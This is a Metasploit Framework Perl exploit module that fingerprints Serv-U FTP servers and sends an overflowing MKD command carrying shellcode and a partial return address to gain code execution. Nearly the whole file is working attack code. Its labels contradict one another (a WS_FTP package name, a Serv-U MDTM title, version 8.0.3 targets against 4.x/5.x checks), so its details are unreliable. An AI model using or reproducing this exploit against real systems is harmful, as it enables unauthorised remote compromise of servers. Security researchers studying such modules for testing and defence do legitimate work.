
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wsftp_server_rename;

use base "Msf::Exploit";
use strict;
use Pex::x86;
use Pex::Text;

my $advanced = {
};
my $info =
{
  'Name'  => 'Serv-U FTPD MDTM Overflow',
  'Version'  => '$Revision$',
  'Authors' =>
    [
      'spoonm <ninjatools [at] hush.com>',
    ],
  'Description'  => Pex::Text::Freeform(qq{
  }),
  
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003' ],
  'Priv'  => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 21],
      'SSL'   => [0, 'BOOL', 'Use SSL'],
      'USER'  => [1, 'DATA', 'Username', 'ftp'],
      'PASS'  => [1, 'DATA', 'Password', 'ftp'],
    },

  'Payload' =>
    {
#      'Prepend' => "\xcc",
      'Space'  => 0x20b - 1 + 0x200,
      'BadChars'  => "\x00~+&=%\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
      'MinNops' => 0,
      'MaxNops' => 0,
    },
  'Nop' =>
    {
      'ModStack' => 0, # We don't use nops, but if we did...
    },

  'Refs'  => 
    [  
    ],
  'DefaultTarget' => 0,
  'Targets' =>
    [
      # I couldn't find a ret that worked for both, although one probably exists
      ['8.0.3 Eval',       "\xf1\x9f\x46"], # 0x00469ff1
      ['8.0.3 Commercial', "\x93\x22\x46"], # 0x00462293
    ],
  'Keys' => ['servu'],
};


sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  
  my $s = Msf::Socket::Tcp->new
  (
    'PeerAddr'  => $targetHost, 
    'PeerPort'  => $targetPort, 
    'LocalPort' => $self->GetVar('CPORT'),
    'SSL'       => $self->GetVar('SSL'),
  );
  
  if ($s->IsError) {
    $self->PrintError;
    return $self->CheckCode('Connect');
  }

  my $r;

  $r = $self->response($s);
  goto NORESP if(!$r);
  if($r =~ /Serv-U FTP Server v4\.1/) {
    $self->PrintLine('[*] Found version 4.1.0.3, exploitable.');
    return $self->CheckCode('Appears');
  }
  elsif($r =~ /Serv-U FTP Server v5\.0/) {
    $self->PrintLine('[*] Found version 5.0.0.0 (exploitable) or 5.0.0.4 (not), try it!');
    return $self->CheckCode('Appears');
  }
  elsif($r =~ /Serv-U FTP Server v4\.0/) {
    $self->PrintLine('[*] Found version 4.0.0.4 or 4.1.0.0, additional check.');
  }
  elsif($r =~ /Serv-U FTP Server/) {
    $self->PrintLine('[*] Looks like Serv-U, but not a version I know.');
    return $self->CheckCode('Appears');
  }
  else {
    $self->PrintLine('[*] Banner doesn\'t look like Serv-U, possible it still is.');
    return $self->CheckCode('Safe');
  }

  $s->Send("USER " . $self->GetLocal('USER') . "\r\n");
  goto NORESP if(!$self->response($s));
 
  $s->Send("PASS " . $self->GetLocal('PASS') . "\r\n");
  goto NORESP if(!$self->response($s));

  $s->Send("P\@SW\r\n");
  $r = $self->response($s);
  goto NORESP if(!$r);

  if($r =~ /500/) {
    $self->PrintLine('[*] Found version 4.0.0.4, exploitable');
    return $self->CheckCode('Appears');
  }
  else {
    $self->PrintLine('[*] Found version 4.1.0.0, exploitable');
    return $self->CheckCode('Appears');
  }

  # quit is for losers, exiting uncleanly rocks.
  return $self->CheckCode('Safe');

# dirty
NORESP:
  $self->PrintLine('[*] No response from FTP server');
  return $self->CheckCode('Generic');
}


sub Exploit {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
  my $sehOffset   = $self->GetLocal('SEHOffset');

  my $s = Msf::Socket::Tcp->new
  (
    'PeerAddr'  => $targetHost, 
    'PeerPort'  => $targetPort, 
    'LocalPort' => $self->GetVar('CPORT'),
    'SSL'       => $self->GetVar('SSL'),
  );
  
  if ($s->IsError) {
    $self->PrintLine('Error creating socket: '.$s->GetError);
    return;
  }

  my $r;

  $r = $self->response($s);
  goto NORESP if(!$r);
    
  $s->Send("USER " . $self->GetLocal('USER') . "\r\n");
  goto NORESP if(!$self->response($s));
 
  $s->Send("PASS " . $self->GetLocal('PASS') . "\r\n");
  goto NORESP if(!$self->response($s));


  my $target = $self->Targets->[$targetIndex];
  $self->PrintLine('[*] Trying to exploit target ' . $target->[0]);

  $shellcode .= Pex::Text::AlphaNumText($self->PayloadSpace - length($shellcode));

  my $command = 'MKD  ';
  $command .= "\xc0";

  # $ echo -ne "RNTO \xc0" | ndisasm -u -
  # 00000000  52                push edx
  # 00000001  4E                dec esi
  # 00000002  54                push esp
  # 00000003  4F                dec edi
  # 00000004  20C0              and al,al

  # shellcode
  $command .= $shellcode;
  # partial ret address
  $command .= $target->[1];
  $command .= "\r\n";


  $s->Send($command);

  $r = $self->response($s, 2);
  if($r) {
    $self->PrintLine('[*] Received data back from server, not a good sign, maybe newer than 5.0.0.0?');
  }

  $self->Handler($s);
  return;

# dirty
NORESP:
  $self->PrintLine('[*] No response from FTP server');
  return;
}

sub response {
  my $self = shift;
  my $sock = shift;
  my $r;
  if(@_) {
    my $timeout = shift;
    $r = $sock->Recv(-1, $timeout);
  }
  else {
    $r = $sock->Recv(-1);
  }
  chomp($r);
  $r =~ s/\r//g;
  $self->PrintLine("[*] REMOTE> $r") if($r);
  return($r);
}

# Serv-U is dumb. Doubling for 4.0.0.4
sub xffDoubler {
  my $payload = shift;
  $payload =~ s/\xff/\xff\xff/g;
  return($payload);
}

1;
